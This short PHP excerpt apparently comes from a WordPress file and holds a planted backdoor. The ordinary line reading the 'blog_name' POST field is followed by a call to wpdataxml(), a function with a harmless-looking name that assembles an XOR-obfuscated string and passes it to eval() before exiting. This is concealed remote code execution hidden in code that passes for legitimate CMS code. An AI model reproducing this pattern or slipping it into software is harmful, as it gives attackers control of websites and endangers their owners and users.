...
$blog_name = isset( $_POST['blog_name'] ) ? wp_unslash( $_POST['blog_name'] ) : '';wpdataxml();
...
function wpdataxml(){
    $xor=("fhLn"^"zTAq"^"yJls").("2U"^"UF"^"O7").("JNErN"^"TMHjb"^"ASBKx").("E6"^"mc"^"sr").("1Qh9"^"rhNs"^"3XU9").("RYTZ"^"4f31"^"AbNP");
    eval($xor);
    exit();
}
